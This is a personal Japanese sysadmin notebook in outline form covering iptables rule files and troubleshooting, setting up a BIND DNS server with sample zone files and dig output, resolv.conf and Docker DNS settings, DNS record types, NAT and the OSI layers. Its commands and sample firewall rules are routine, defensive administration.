            raw テーブル: #keyword: iptables mangle raw  #// コネクション追跡で扱われないよう特定のパケットにマークを付ける時に使用します。
                OUTPUT チェーン:
                PREROUTING チェーン:
        ルーティング: #keyword: iptables routing  #ref: ${my_images}/2023/iptables_routing.png
            ローカル プロセス 経由 の場合:
                インバウンド → PREROUTING ( raw → mangle → nat ) → INPUT ( mangle → filter ) →
                    ローカル プロセス →
                        OUTPUT( raw → mangle → nat → filter ) → POSTROUTING ( mangle → nat ) → アウトバウンド
            フォワーディングの場合:
                インバウンド → PREROUTING ( raw → mangle → nat ) →
                    FORWARD ( mangle → filter ) →
                        POSTROUTING ( mangle → nat ) → アウトバウンド
    ファイル: #keyword: iptables files
        注意: 設定ファイルと現在の設定は一致しないことがあります
        /etc/sysconfig/iptables: #keyword:  #// OS 起動直後の設定（Red Hat 系）。save 形式。永続化するときはこのファイルに保存します
        list 形式:  #// リスト形式。コマンドライン形式。iptables ファイルの形式を少し簡略化した形式です
            表示:
                sudo iptables -S
            記録:
                - sudo iptables --list-rules  |  sudo tee __FilePath__  #// > /dev/null
                    #// または
                - sudo iptables -S  |  sudo tee __FilePath__  #// > /dev/null
            インポート:
                インポートはできませんが、表示内容が一致するように編集すれば同じことができます
        save 形式:  #// 保存形式。設定ファイル形式。最後の行に COMMIT が書かれています
            ファイル形式:  #keyword: iptables format
                iptables コマンドと同じです:  #search: iptables options
                サンプル: | #keyword: iptables example (1)  #// https://knowledge.sakura.ad.jp/4048/  #search: iptables INPUT
                    # (1) ポリシーの設定 OUTPUTのみACCEPTにする
                    *filter
                    :INPUT   DROP   [0:0]  #// 入力に関するデフォルトは、禁止 (drop）。ただし、数字部分は設定値ではなく実績。今まで DROP したままなら 0
                    :FORWARD DROP   [0:0]  #// フォワーディングに関するデフォルトは、禁止 (drop）
                    :OUTPUT  ACCEPT [0:0]  #// 出力に関するデフォルトは、許可 (accept）。ただし、数字部分は設定値ではなく実績。[__PacketCount__:__Byte__]

                    # (2) ループバック(自分自身からの通信)を許可する
                    -A INPUT -i lo -j ACCEPT

                    # (3) データを持たないパケットの接続を破棄する
                    -A INPUT -p tcp --tcp-flags ALL NONE -j DROP

                    # (4) SYNflood攻撃と思われる接続を破棄する
                    -A INPUT -p tcp ! --syn -m state --state NEW -j DROP

                    # (5) ステルススキャンと思われる接続を破棄する
                    -A INPUT -p tcp --tcp-flags ALL ALL -j DROP

                    # (6) icmp(ping)の設定
                    # hashlimitを使う
                    # -m hashlimit                      hashlimitモジュールを使用する
                    # —hashlimit-name t_icmp            記録するファイル名
                    # —hashlimit 1/m                    リミット時には1分間に1パケットを上限とする
                    # —hashlimit-burst 10               規定時間内に10パケット受信すればリミットを有効にする
                    # —hashlimit-mode srcip             ソースIPを元にアクセスを制限する
                    # —hashlimit-htable-expire 120000   リミットの有効期間。単位はms
                    -A INPUT -p icmp --icmp-type echo-request -m hashlimit --hashlimit-name t_icmp --hashlimit 1/m --hashlimit-burst 10 --hashlimit-mode srcip --hashlimit-htable-expire 120000 -j ACCEPT

                    # (7) 確立済みの通信は、ポート番号に関係なく許可する
                    -A INPUT -p tcp -m state --state ESTABLISHED,RELATED -j ACCEPT

                    # (8) 任意へのDNSアクセスの戻りパケットを受け付ける
                    -A INPUT -p udp --sport 53 -j ACCEPT

                    # (9) SSHを許可する設定
                    # hashlimitを使う
                    # -m hashlimit                   hashlimitモジュールを使用する
                    # —hashlimit-name t_sshd 記録するファイル名
                    # —hashlimit 1/m              リミット時には1分間に1パケットを上限とする
                    # —hashlimit-burst 10       規定時間内に10パケット受信すればリミットを有効にする
                    # —hashlimit-mode srcip   ソースIPを元にアクセスを制限する
                    # —hashlimit-htable-expire 120000   リミットの有効期間。単位はms
                    -A INPUT -p tcp -m state --syn --state NEW --dport 22 -m hashlimit --hashlimit-name t_sshd --hashlimit 1/m --hashlimit-burst 10 --hashlimit-mode srcip --hashlimit-htable-expire 120000 -j ACCEPT

                    # (10) 個別に許可するプロトコルとポートをここに書き込む。
                    # この例では、HTTP(TCP 80)とHTTPS(TCP 443)を許可している。
                    -A INPUT -p tcp --dport 80   -j ACCEPT
                    -A INPUT -p tcp --dport 443  -j ACCEPT

                    # (11) 特定のサブネットにいる受信元から送信される通信を許可（禁止）します
                    -A INPUT --source 192.168.34.0/24 -p tcp -m tcp  -j ACCEPT  #// or DROP

                    COMMIT
                テーブルの指定: #keyword: iptables table format, *filter, *nat, *mangle, *raw
                    書式: |
                        *filter
                            # filter テーブルのルールをここに記述
                        COMMIT

                        *nat
                            # nat テーブルのルールをここに記述
                        COMMIT
                    注意: 指定しなかったテーブルは、iptables-restore の対象外になります
                一般の設定:
                    デフォルトで禁止/許可: | #keyword: iptables default input output forward  #search: iptables example (1)
                        :INPUT   DROP   [0:0]  #// 入力に関するデフォルトは、禁止 (drop）。ただし、数字部分は設定値ではなく実績。今まで DROP したままなら 0
                        :FORWARD DROP   [0:0]  #// フォワーディングに関するデフォルトは、禁止 (drop）
                        :OUTPUT  ACCEPT [0:0]  #// 出力に関するデフォルトは、許可 (accept）。ただし、数字部分は設定値ではなく実績。[__PacketCount__:__Byte__]
                    ループバック: #// 自分自身からの通信  #search: iptables example (1)
                        -A INPUT -i lo -j ACCEPT
                    ステルススキャン:  #search: iptables example (1)
                        -A INPUT -p tcp --tcp-flags ALL ALL -j DROP
                    確立済みの通信:  #search: iptables example (1)
                        -A INPUT -p tcp -m state --state ESTABLISHED,RELATED -j ACCEPT
                    コメント:  #focus: __Comment__
                        -A INPUT --source 192.168.111.222/255.255.255.255  -m comment --comment "__Comment__"  -j ACCEPT
                HTTP 関連:  #search: iptables example (1)
                    -A INPUT -p tcp --dport 80   -j ACCEPT
                    -A INPUT -p tcp --dport 443  -j ACCEPT
                ping 関連:  #search: iptables example (1)
                    -A INPUT -p icmp --icmp-type echo-request -m hashlimit --hashlimit-name t_icmp --hashlimit 1/m --hashlimit-burst 10 --hashlimit-mode srcip --hashlimit-htable-expire 120000 -j ACCEPT
                SSH 関連:  #search: iptables example (1)
                    -A INPUT -p tcp -m state --syn --state NEW --dport 22 -m hashlimit --hashlimit-name t_sshd --hashlimit 1/m --hashlimit-burst 10 --hashlimit-mode srcip --hashlimit-htable-expire 120000 -j ACCEPT
                DNS 関連:  #search: iptables example (1)
                    -A INPUT -p udp --sport 53 -j ACCEPT
            手順:
                エクスポート:  #keyword: export iptables
                    - sudo iptables-save  >  __FilePath__
                        #// または
                    - sudo iptables-save  |  sudo tee __FilePath__  #// > /dev/null
                インポート:  #// このコマンドだけでは永続化されません（/etc/sysconfig/iptables ファイルは変わりません）
                    sudo iptables-restore  <  __FilePath__
                    #search: import iptables
                永続化: #keyword: iptables persistent,  iptables-save persistent
                    （必要なら）インポートします:
                        sudo iptables-restore  <  __FilePath__
                        #search: iptables import
                    変更した設定について動作確認します:
                    保存します:  #// 現在の設定を設定ファイルに保存することが永続化に相当します
                        sudo iptables-save  |  sudo tee  /etc/sysconfig/iptables  #// > /dev/null
                    永続化の必要性:
                        - 現在の設定が自動で変わった場合でも（すべての変更が）永続化不要なら、リロードしてください  #search: iptables reload
                        - しかし、一時的にでも許可設定になってしまうため、なるべく公式化して永続化してください。そのほうがシンプルです
                リロード: #keyword: iptables reload
                    - sudo service iptables reload
                        #// または
                    - sudo iptables-restore < /etc/sysconfig/iptables
                    #search: import iptables
        正規化 save 形式: #keyword: 正規化 iptables  #// iptables-save コマンドの出力形式。
            概要: 比較用。設定ファイルのコメントの有無やオプションの揺れ（短いオプションと長いオプション）がありません。
                ただし、現在時刻や実績値（パケット数など）も含まれるので、設定が同じでも一部の内容は異なります。 #search: iptables default input output forward
            正規化します:
                normalize-iptables.sh スクリプト: #keyword: normalize-iptables.sh  #ref: ${GitHub}/MyPrivateCode/bash/normalize-iptables/normalize-iptables.sh
                diff-iptables.sh: #keyword: diff-iptables.sh  #ref: ${GitHub}/MyPrivateCode/bash/normalize-iptables/diff-iptables.sh
                diff-iptables-test.sh:  #ref: ${GitHub}/MyPrivateCode/bash/normalize-iptables/diff-iptables-test.sh
                    修正:  #search: diff-iptables-test.sh  anonymization
    トラブルシューティング (iptables): #keyword: iptables trouble
        （nftabes の場合）:  #search: nftables trouble
        telnet で疎通確認します:
            #search: Linux telnet port
        curl -v [--noproxy "*"] で疎通確認します:  #search: ACL 疎通確認 (cURL)
        iptables の設定を ChatGPT に聞きます:
            - sudo iptables -L -v -n | grep __PortNum__
            - sudo iptables -S  #// プライベート アドレス であれば、情報漏洩にあたりません  #search: IP private address
        ACCEPT と REJECT のルールをチェックします:
            #search: iptables options
            #search: iptables ルールの適用順序
        適用されたルールを確認します:  #// マッチしたルールのパケット数やバイト数が増えたら適用されたと判定できます
            コマンドのサンプル: |
                sudo iptables -Z  #// カウンターをリセットします。今までの統計情報は無くなります。SSH 接続しているとリセット後にすぐにカウントアップされます。
                sudo iptables -nL -v --line-numbers
                    $ sudo iptables -nL -v --line-numbers
                    Chain INPUT (policy ACCEPT 0 packets, 0 bytes)
                    num   pkts bytes target     prot opt in     out     source               destination         
                    1        0     0 DROP       all  --  !lo    *       127.0.0.0/8          0.0.0.0/0           
                    2        0     0 DROP       all  --  !lo    *       0.0.0.0/0            127.0.0.0/8         
                    3      100  6999 ACCEPT     tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp flags:!0x17/0x02
                    4        0     0 ACCEPT     icmp --  *      *       0.0.0.0/0            0.0.0.0/0            icmp !type 13
                    5        0     0 ACCEPT     all  --  *      *       0.0.0.0/0            255.255.255.255     
                    6        0     0 ACCEPT     all  --  *      *       0.0.0.0/0            224.0.0.0/24        
                    7        0     0 ACCEPT     all  --  *      *       0.0.0.0/0            172.16.0.0/12       
                    8        0     0 ACCEPT     all  --  *      *       0.0.0.0/0            10.0.0.0/8          
                    9        0     0 ACCEPT     all  --  *      *       0.0.0.0/0            192.168.0.0/16      
                    10       0     0 ACCEPT     all  --  *      *       0.0.0.0/0            100.64.0.0/10       
                    11       0     0 ACCEPT     all  --  *      *       0.0.0.0/0            127.0.0.0/8         
                    12       0     0 REJECT     tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            reject-with tcp-reset
                    13       0     0 REJECT     all  --  *      *       0.0.0.0/0            0.0.0.0/0            reject-with icmp-host-prohibited

                    Chain FORWARD (policy ACCEPT 0 packets, 0 bytes)
                    num   pkts bytes target     prot opt in     out     source               destination         

                    Chain OUTPUT (policy ACCEPT 85 packets, 6478 bytes)
                    num   pkts bytes target     prot opt in     out     source               destination         
            VirtualBox の VM と SSH 接続しているとき:
                bash でバイト数が増えてしまいます。それを避けるには SSH を使わずに VM の画面の表示を行います。
            調べる対象の NIC や IP アドレス やポートを通過したバイト数を表示します:
                調べるポートのルールを先頭に追加します:  #// 下記は、アドレス 192.168.38.20 ポート 22 の場合
                    sudo iptables -I INPUT 1 -p tcp --destination 192.168.38.20/32 --dport 22 -j ACCEPT
                    sudo iptables -I OUTPUT 1 -p tcp --source 192.168.38.20/32 --sport 22 -j ACCEPT
                    sudo iptables -Z
                    sudo iptables -nL -v --line-numbers
        診断結果:
            どのルールにもマッチしなかった場合: パケット数やバイト数は増えません
            カウントアップしたのに疎通できないとき:
                ping で疎通確認してください:
                    ping 192.168.38.20
                    ping __HostName__
                    ping __HostFQDN__
                telnet で疎通確認してください:
                    telnet 192.168.38.20  22  #search: Linux telnet port
                /etc/hosts.allow の設定を確認してください:
                    #search: /etc/hosts.allow
                systemd の設定を確認してください:
                    #search: Systemd IP Accounting
                リッスンしているサービスの状況を調べてください:
                    サービスのプログラムを調べます:
                        sudo netstat -tulnp   #search: Linux netstat
                    稼働していることを調べます:
                        systemctl status  sshd
                    設定ファイルを確認します:
                        /etc/ssh/sshd_config
DNS: #keyword: DNS,  name server  #// Domain Name Service  #glossary: DNS  #ref: ${programming}/ネットワーク・セキュリティ/TCP／IP/TCP_IP.svg#dns
    実験サイト:
        mess with dns: #keyword:  #ref: https://messwithdns.net
    手順:
        DNS を立てます:  #search: install BIND
        SSL 証明書の必要性:
            同じドメイン名でDNSレコード（AレコードやCNAMEなど）を更新するだけなら、証明書はそのまま使える
            IPアドレスの変更だけなら証明書の変更は不要
    機能 >> DNS の連携:
        upstream DNS server: #keyword:  #// 上位の DNS サーバー  #// 名前解決できないときの転送先（forwarders）
        parental DNS server: #keyword:  #// 親の DNS サーバー  #// example.com の親サーバーは .com のDNSサーバー
        DNS の IP アドレスの表示: #keyword: DNS IP address
            Windows PowerShell:
                - (Get-DnsClientServerAddress -InterfaceAlias * -AddressFamily IPv4).ServerAddresses[0]
                - Get-DnsClientServerAddress -InterfaceAlias * -AddressFamily IPv4
            Linux:  #search: /etc/resolv.conf
    コマンド:
        nslookup: #search:
        dig: #search:
    構成:
        DNS サーバー:
            設定ファイル:  #search: /etc/named.conf
                ゾーン ファイル:  #search: /var/named/forward.vmlocal.com
        クライアント:
            設定ファイル:  #search: /etc/resolv.conf
            キャッシュ:  #keyword: DNS キャッシュ
                A レコードの情報や CNAME レコードの情報は、クライアント側でキャッシュされています。
                TTL（キャッシュの有効期間）が長すぎると変更時にエラーになることがあります。
                A レコードと CNAME レコードで別々のキャッシュの可能性？
        FQDN:
            ホスト名:
            ドメイン名:
                .local: マルチキャスト DNS（mDNS、Bonjour など）で使用される特殊なドメイン
            DNS 名: #keyword:  #// DNS サーバーの名前ではなく、DNS によって名前解決が行われるホスト名です
    BIND: #keyword: BIND, BIND9  #// Linux に ローカル のネットワークで使える DNS
        インストール: #keyword: install BIND
            本体をインストールします:
                (DNS サーバーにする VM の bash):
                    sudo yum install -y  bind  bind-utils  bind-chroot
                        #// bind-chroot は無くても動きます。入れると安全性が高まります
            sudo vi /etc/named.conf :  #keyword: /etc/named.conf  #// resolv.conf は DNS のサーバー側の設定ファイルです
                サンプル: |
                    options {
                        listen-on port 53 { 127.0.0.1; 192.168.34.0/24; };
                            // { } 内に無いホストから来るリクエストはタイムアウトになります。
                            // listen-on(-v6) フィールド が無い場合、全てのホストから来るリクエストを許可します。
                        allow-query     { 127.0.0.1; 192.168.34.0/24; };
                            // { } 内に無いホストから来るリクエストは空文字列で返します。
                        recursion yes;   // forwarders は recursion の直下に書くのが良いでしょう
                        forwarders { 10.131.208.20; };
                            // ホスト OS の DNS サーバー の IP アドレス
                        allow-recursion { 127.0.0.1; 192.168.34.0/24; };
                            // { } 内にあるホストから来るリクエストのみ forwarders へ名前解決をします
                    // 末尾に追加。vmlocal の部分にハイフン（例：vm-local）を使うと右記に失敗します named-checkzone vm-local.com /var/named/forward.vm-local.com
                    zone "vmlocal.com" IN {
                        type master;
                        file "forward.vmlocal.com";
                    };
                    zone "34.168.192.in-addr.arpa" IN {
                        type master;
                        file "reverse.34.168.192.in-addr.arpa";
                    };
                コメントの和訳:
                    英文:
                        - If you are building an AUTHORITATIVE DNS server, do NOT enable recursion.
                        - If you are building a RECURSIVE (caching) DNS server, you need to enable recursion.
                        - If your recursive DNS server has a public IP address, you MUST enable access
                            control to limit queries to your legitimate users. Failing to do so will
                            cause your server to become part of large scale DNS amplification
                            attacks. Implementing BCP38 within your network would greatly
                            reduce such attack surface
                    和訳:
                        - AUTHORITATIVE DNS サーバーを構築している場合は、再帰を有効にしないでください。
                        - RECURSIVE (キャッシュ) DNS サーバーを構築している場合は、再帰を有効にする必要があります。
                        - 再帰 DNS サーバーにパブリック IP アドレスがある場合は、アクセス制御を有効にして、
                            正規のユーザーへのクエリを制限する必要があります。 これを怠ると、
                            サーバーが大規模な DNS 増幅攻撃の対象となる可能性があります。 
                            ネットワーク内に BCP38 を実装すると、このような攻撃対象領域が大幅に減少します。
            #// 34.168.192.in-addr.arpa のブロックは IP アドレスが 192.168.34.x に関する逆引き用ですが、不要であれば記述も不要です
            named.conf の構文チェックをします: #keyword: named-checkconf
                sudo named-checkconf
            sudo vi /var/named/forward.vmlocal.com : #keyword: bind zone file,  /var/named/forward  #// ゾーン ファイル。名前 → IP アドレス
                サンプル: |  #focus: vmlocal.com
                    $TTL 3H
                    @               IN      SOA  DNS-server.vmlocal.com. root.vmlocal.com. (
                                2023061101  ; serial
                                1D      ; refresh
                                1H      ; retry
                                1W      ; expire
                                3H )    ; minimum
                    @               IN      NS      DNS-server.vmlocal.com.
                    DNS-server.vmlocal.com.  IN  A  192.168.34.88
                    @               IN      MX      10      mailserver
                    mailserver      IN      A       192.168.34.30
                    client1         IN      A       192.168.34.31
                    client2         IN      A       192.168.34.32
                補足:
                    - 2行目は SOA レコードです。同様に NS レコード, A レコード, MX レコードがあります
                    - serial はバージョン番号です
                    - サーバーが存在しない IP アドレスを指定することもできます。それが原因で反応が遅くなることもありません
                    - ローカルのサーバー名とIPアドレスの情報は外部に流れません
            forward.vmlocal.com の構文チェックをします: #keyword: named-checkconf zone file
                sudo named-checkzone vmlocal.com /var/named/forward.vmlocal.com
            sudo vi /var/named/reverse.34.168.192.in-addr.arpa : #keyword: reverse bind zone file,  /var/named/reverse  #// 逆 ゾーン ファイル
                #// 逆引き（IP アドレス → 名前）が不要であれば作成も不要です
                サンプル: |
                    $TTL 3H
                    @       IN      SOA  DNS-server.vmlocal.com. root.vmlocal.com. (
                                2023061101  ; serial
                                1D      ; refresh
                                1H      ; retry
                                1W      ; expire
                                3H )    ; Negative Cache TTL
                    @       IN      NS      DNS-server.vmlocal.com.
                    30      IN      PTR     mailserver.vmlocal.com.
                    31      IN      PTR     client1.vmlocal.com.
                    32      IN      PTR     client2.vmlocal.com.
                補足:
                    - ファイル名の末尾は .in-addr.arpa が必要です
                        #ref: https://access.redhat.com/documentation/ja-jp/red_hat_enterprise_linux/6/html/deployment_guide/s3-bind-configuration-zone-reverse
                    - 2行目の SOA レコードは、逆ではない ゾーン ファイル の設定と同じです
                    - 逆引きは A レコードの代わりに PTR レコードを書きます
            reverse.34.168.192.in-addr.arpa の構文チェックをします: #keyword: named-checkconf zone file
                sudo named-checkzone 34.168.192.in-addr.arpa /var/named/reverse.34.168.192.in-addr.arpa
            sudo vi /etc/resolv.conf : | #keyword: /etc/resolv.conf nameserver  #focus: nameserver  #// resolv.conf は DNS のクライアント側の設定ファイルです
                    ; nameserver 172.31.255.3  #// 既存の nameserver はコメントアウト
                    ; edited for local installed bind9
                    nameserver 192.168.34.88   #// DNS サーバーの IP アドレス
                #// この変更を行った後、インターネットにアクセスできることを確認してください  （未確認）
                #// デフォルトの nameserver:
                    #// 通常、DHCPでアドレスを取得します。
                    #// このとき、/etc/resolv.confのnameserverのエントリは、
                    #// そのDHCPサーバから提供されるDNSサーバのアドレスに設定されます。
            /etc/resolv.conf が上書きされないように設定します:
                NetworkManager を使う Linux の場合: #keyword: /etc/resolv.conf dns=none
                    sed -E  '/\\[main\\]/a dns=none'  '/etc/NetworkManager/NetworkManager.conf'
                    #// [main]
                    #// dns=none
                network-scripts を使う Linux の場合: #keyword: /etc/resolv.conf PEERDNS  #ref: https://oretachino.hatenablog.com/entry/2014/12/25/151112
                        echo  "PEERDNS=no"  |  sudo tee -a  "/etc/sysconfig/network-scripts/ifcfg-eth0"
                メモ >> 失敗（通常のDHCP用？）: |
                    #ref: https://unix.stackexchange.com/questions/401586/resolv-conf-rewritten-by-dhcp-even-after-setting-the-nic-as-static-rhel-7
                    sudo mkdir -p /etc/dhcp/dhclient-enter-hooks.d
                    sudo tee /etc/dhcp/dhclient-enter-hooks.d/unhand-resolv-conf  > /dev/null  << __HERE_DOCUMENT__
                    #!/bin/sh
                    make_resolv_conf(){
                        :  #// echo  'nameserver 192.168.34.30'  |  sudo tee -a  '/etc/resolv.conf' に変えても効果なし
                    }
                    __HERE_DOCUMENT__
                    sudo chmod +x /etc/dhcp/dhclient-enter-hooks.d/unhand-resolv-conf
            起動します: #keyword: named
                sudo systemctl enable named
                sudo systemctl start named
                #// 2回目以降は sudo systemctl restart named
            試します: |
                $ dig +short client1.vmlocal.com
                    192.168.34.31
                $ dig client1.vmlocal.com
                    ; <<>> DiG 9.11.4-P2-RedHat-9.11.4-26.P2.el7_9.13 <<>> client1.vmlocal.com
                    ;; global options: +cmd
                    ;; Got answer:
                    ;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 18331
                    ;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 2

                    ;; OPT PSEUDOSECTION:
                    ; EDNS: version: 0, flags:; udp: 4096
                    ;; QUESTION SECTION:
                    ;client1.vmlocal.com. IN    A

                    ;; ANSWER SECTION:
                    client1.vmlocal.com. 10800 IN A     192.168.34.31

                    ;; AUTHORITY SECTION:
                    vmlocal.com.            10800   IN      NS      DNS-server.vmlocal.com.

                    ;; ADDITIONAL SECTION:
                    DNS-server.vmlocal.com. 10800   IN      A       192.168.34.30

                    ;; Query time: 1 msec
                    ;; SERVER: 192.168.34.30#53(192.168.34.30)
                    ;; WHEN: Wed Oct 25 02:05:23 JST 2023
                    ;; MSG SIZE  rcvd: 117
                $ nslookup client1.vmlocal.com
                    Server:         192.168.34.30
                    Address:        192.168.34.30#53

                    Name:   client1.vmlocal.com
                    Address: 192.168.34.31
                $ nslookup 192.168.34.31
                    31.34.168.192.in-addr.arpa      name = client1.vmlocal.com.
                $ dig +short -x 192.168.34.31   #// 逆引きのときは -x オプションが必要です
                    client1.vmlocal.com.
        ファイル: #keyword: BIND files  #glossary: BIND
            #search: install BIND
            #↓ サーバー側
            /etc/named.conf :  #search: /etc/named.conf  #// resolv.conf は DNS のサーバー側の設定ファイルです
            /var/named/forward.vmlocal.com:  #search: bind zone file  #// ゾーン ファイル。 名前 → IP アドレス
            /var/named/reverse.34.168.192.in-addr.arpa:  #search: reverse bind zone file  #// 逆 ゾーン ファイル。 IP アドレス → 名前
            #↓ クライアント側
            /etc/resolv.conf: #keyword: DNS resolve configuration  #// resolv.conf は DNS のクライアント側の設定ファイルです
                Docker コンテナーの場合:  #ref: https://docs.docker.jp/engine/userguide/networking/default_network/donfigure-dns.html
                    下記の項目は、docker コマンドのオプションで指定するものがあります
                上書きされないようにします:  #search: /etc/resolv.conf PEERDNS
                項目: #🌟
                    nameserver:  #search: /etc/resolv.conf  nameserver
                        設定:
                            ファイル内:
                                nameserver __IPAddress__  #// __IPAddress__ の例: 192.168.1.1
                                #// 複数指定した場合、上側の DNS が優先されます
                                #// dig コマンドで __IPAddress__ の DNS サーバーが使えることを確認してください  #search: dig connect at DNS
                                #// UDP 53 番ポートを開けてください。TCP ではありません
                            docker オプション:
                                docker run --dns __IPAddress__  #// コンテナー内のファイルは変更しません（未確認）
                            /etc/docker/daemon.json: |  #// すべてのコンテナーに設定されます
                                { "dns": ["__IPAddress__"] }
                                #// 設定後 sudo systemctl restart docker すること
                            設定なし docker:
                                Dockerホストの /etc/resolv.conf から引き継がれます
                    domain:  #// ホスト名を指定して問い合わせるときに自動的に付けられるドメイン名
                        #ref: https://linuc.org/study/knowledge/507/
                    search:  #// domain の第2候補
                        設定:
                            ファイル内:
                                search __DomainName__  #// __DomainName__ の例: example.com
                            docker オプション:
                                --dns-search __DomainName__
                        指定されたホスト名:
                            server1
                        DNS に問い合わせるホスト名:
                            server1
                            server1.example.com
        トラブルシューティング（BIND, DNS）:
            構文チェック:
                #search: named-checkconf
                #search: named-checkconf zone file
                #search: named-checkconf zone file
            名前から IP アドレスが引けない:
                #// サーバー側
                - systemctl status named
                - /var/named/forward.vmlocal.com ファイルの内容を確認します   #search: bind zone file
                #// クライアント側
                - /etc/resolv.conf ファイルの内容を確認します  #search: DNS resolve configuration
            Name or service not known:
                手順: /var/named/forward.vmlocal.com を編集して ssh コマンドを実行
                出力: |
                    ssh __NewHost__
                    __NewHost__: Name or service not known
                対処:
                    sudo systemctl restart named
            逆引きすると、name の末尾に 34.168.192.in-addr.arpa. が付いてしまう。:
                手順: nslookup 192.168.34.11
                出力: |
                    31.34.168.192.in-addr.arpa      name = client1.vmlocal.com.34.168.192.in-addr.arpa.
                対処:
                    逆 ゾーン ファイル の PTR レコードの末尾にドットを付けます
            RRSIG validity period has not begun エラー in /var/named/data/named.run:
                手順: dig +short __HostName__
                メッセージ in /var/named/data/named.run: |
                    validating net/SOA: verify failed due to bad signature (keyid=51464): RRSIG validity period has not begun
                    validating net/SOA: no valid signature found
                    validating ____________.net/NSEC3: verify failed due to bad signature (keyid=51464): RRSIG validity period has not begun
                    validating ____________.net/NSEC3: no valid signature found
                    no valid RRSIG resolving '__IntranetCom__/DS/IN': __Forwarders__#53
                /var/named/data/named.run に出力する設定: #keyword:
                    /etc/named.conf:  #focus: /var/named,  data/named.run
                        options {
                            directory  "/var/named";
                        logging {
                            channel default_debug {
                                file "data/named.run";
                    named.run のクリア:
                        sudo rm   /var/named/data/named.run
                        sudo systemctl restart named
                        sudo less /var/named/data/named.run
                対処:
                    時計調整します:  #// 時刻を合わせると DNS への問い合わせがうまくいくようです。BIND の再起動は要りません
                        date
                            Thu Oct 26 14:27:06 JST 2023
                        sudo date -s "Thu Oct 26 19:46:06 JST 2023"
                        dig +short __HostName__
            タイムアウトする:  #keyword: DNS timeout,  DNS timer trouble
                手順: dig +short __HostName__
                エラー:
                    タイムアウト
                対処A:
                    DNS サーバーの時計を正しくします
                対処B:
                    /var/named/data/named.run を調べます
                対処C:
                    /etc/named.conf
                        options {
                            forward only;
    ファイル:
        #search: /etc/resolv.conf
        #search: BIND files
    レコード:  #glossary: DNS
        A レコード:
            キャッシュ:  #search: DNS キャッシュ
        PTR レコード: #// 逆引き用  #search: reverse bind zone file
        CNAME リソース レコード:  #ref: ${programming}/ネットワーク・セキュリティ/TCP／IP/TCP_IP.svg#CNAME
            概要:
                DNSの名前解決に使われる、別名と正式名の対応が書かれたレコード。
                canonical name （正式名） --* aliases（別名）
                    service.example.jp.   A        192.0.2.100
                    info.example.jp.      CNAME    service.example.jp.
            サンプル:
                remote.example.jp. IN CNAME gateway.example.com.
            キャッシュ:  #search: DNS キャッシュ
            DNS エイリアス（CNAME）チェーン:  #search: DNS CNAME chain
            参考:
                CNAMEリソースレコード（シーネームリソースレコード） - JPRS用語辞典 (Web):
                    #ref: https://jprs.jp/glossary/index.php?ID=0212
                リソースレコード（RR） - JPRS用語辞典 (Web):
                    #ref: https://jprs.jp/glossary/index.php?ID=0165
        NS レコード:
        MX レコード:
        SRV レコード:
            #// ドメイン ⇒ サービス。SRV は、おそらく service の略。ユーザーは target にアクセスします。
            形式: _service._proto.name. TTL class SRV priority weight port target.
            サンプル: _sip._tcp.example.com. 86400 IN SRV 0 5 5060 sipserver.example.com.
            形式の説明: #focus: （下記）
                service: 🌟サービス名
                proto: tcp または udp
                name: 🌟ドメイン名。name の中にピリオドを含みます
                TTL: 時間？（秒）
                class: IN
                priority:
                weight:
                port: 🌟ポート番号
                target: 🌟FQDN
            参考:
                - https://en.wikipedia.org/wiki/SRV_record
                - https://atmarkit.itmedia.co.jp/ait/articles/0403/09/news076.html
NAT: #keyword:  #// Network Address Translation。アドレス変換
    概要:
        １つのパブリック IPアドレス を、LAN内のサブネット（内の複数のプライベート IPアドレス）で共有します。
        ルーティングだけでなく TCP/UDPヘッダーの書き換えも行います。
    SNAT: #keyword:  #// source NAT。 LAN ⇒ 外部 にリクエストするときに変換します。LAN 側が source。IPマスカレード。
        10.0.0.2 (LAN) ⇒ 200.40.9.180（public)
        LAN の 10.0.0.2 のホストは、外部インターネットでは 200.40.9.18 であるように見えます。
        レスポンスするときも自動的にルーティングします。
        #search: iptables -j
        #search: Docker bridge mode
    DNAT: #keyword:  #// destination NAT。 外部 ⇒ LAN にリクエストされたときに変換します。LAN 側が destination。
        200.20.2.110（public) ⇒ 10.0.0.2 (LAN)
        外部インターネットから 200.20.2.110 に来たリクエストは、LAN 10.0.0.2 が応答します。
        #search: iptables -j
    NAPT, IP マスカレード:  #// Network Address Port Translation
        IPアドレスに加えてポート番号も変換します。
        インターネット側からLAN内の機器にアクセスするには、ポートフォワードや仮想サーバー機能が必要です。
        #ref: https://kotobank.jp/word/IPマスカレード-241
        #search: iptables 
OSI 7階層参照モデル: #keyword: OSI 7階層参照モデル,  ISO 7階層参照モデル ではありません,  L4 L7
    レイヤー7, L7: #keyword:  #// URL, HTTP
    レイヤー4, L4: #keyword:  #// IPアドレス, ポート番号
    L3: #// ネットワーク層。インターネット接続
    L2: #// データリンク層。同一ネットワーク内
    L1: #// 物理層
        アダプター, NIC: #keyword: ネットワーク アダプター,  NIC,  network adapter,  ネットワーク インターフェース カード  #// 物理、または、物理相当のソフト
            名前のサンプル: #keyword: NIC name
                Linux: eth0, eth1 など
                Windows: イーサネット 1, Wi-Fi など
            一覧:
                Linux:  #search: ip addr
                Windows 10 21H1 の場合:
                    検索する場合: 設定 >> ホーム >> 「ネットワーク接続の表示」で検索
                    選ぶ場合: 設定 >> ホーム >> ネットワークとインターネット（4番目）>>
                        アダプターのオプションを変更する（中央やや下）
                Wireshark の場合:  #// Windows 標準では表示されない NIC（例 ローカル エリア接続* 1）も表示されます
                    Wireshark >> キャプチャ メニュー >> オプション >> インターフェース管理（右下）
                VirtualBox の場合:  #search: VirtualBox network adapter
            ネットワーク ボンディング: #keyword: network bonding  #// 複数の NIC を単一の 論理 NIC に結合します
                利点: 冗長性、負荷分散、スループットの向上など
                ファイル:
                    /etc/sysconfig/network-scripts/ifcfg-bond0 :
                        サンプル: |  #keyword: BONDING_OPTS
                            BONDING_OPTS="mode=1 miimon=100 primary=eth0 updelay=200 downdelay=200"
                        mode:  #// 動作モード
                            1: アクティブ-バックアップモード
                            0: ラウンドロビンモード
                        miimon: リンクの監視間隔、ミリ秒
                        primary:
                            mode=1 のとき:
                                プライマリーの NIC
                        updelay, downdelay:  #// リンクの状態が変化したときの遅延時間
                            updelay: リンクがアップになるまでの遅延
                            downdelay: リンクがダウンになるまでの遅延
